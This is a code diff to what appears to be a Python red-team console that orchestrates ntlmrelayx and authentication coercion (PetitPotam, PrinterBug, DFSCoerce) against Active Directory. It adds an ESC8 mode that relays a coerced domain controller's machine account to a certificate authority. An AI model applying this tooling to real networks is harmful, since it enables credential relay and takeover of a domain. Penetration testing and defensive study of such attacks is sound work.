@@ -232,7 +232,7 @@ class Console:
         print()
         print("Orchestration:")
         print("  relay [mode] [method]  Coordinate ntlmrelayx + coercion as one action")
-        print("                         modes: ldap-rbcd, ldap-shadow, reflection")
+        print("                         modes: ldap-rbcd, ldap-shadow, reflection, adcs-esc8")
         print("                         methods: coercer, petitpotam, printerbug, dfscoerce")
         print()
         print("Scanning:")
@@ -770,10 +770,24 @@ class Console:
             print("LHOST is not set. Use 'set LHOST <attacker-ip>' first.")
             return
 
-        # Relay target: for LDAP modes, the DC; for reflection, the victim.
-        relay_target = v.get("DC_IP") or v.get("DC")
+        # Relay target depends on the mode:
+        #   - LDAP modes: the DC (DC_IP/DC)
+        #   - ESC8: the CA host/URL (CA), falling back to the DC if unset
+        #   - reflection: the victim itself (resolved in build_plan)
+        if mode is RelayMode.ADCS_ESC8:
+            relay_target = v.get("CA") or v.get("DC_IP") or v.get("DC")
+            if not v.get("CA"):
+                print("Note: CA not set; defaulting the ESC8 relay target to the "
+                      "DC. Use 'set CA <ca-host>' to target the CA explicitly.")
+        else:
+            relay_target = v.get("DC_IP") or v.get("DC")
 
-        victim = v.get("RELAY_VICTIM") or self._prompt_relay_victim()
+        # For ESC8 the host we coerce is the DC (we relay its machine account);
+        # offer that as the default victim.
+        default_victim = v.get("RELAY_VICTIM")
+        if not default_victim and mode is RelayMode.ADCS_ESC8:
+            default_victim = v.get("DC_IP") or v.get("DC")
+        victim = default_victim or self._prompt_relay_victim()
         if not victim:
             print("No victim host provided. Aborting.")
             return
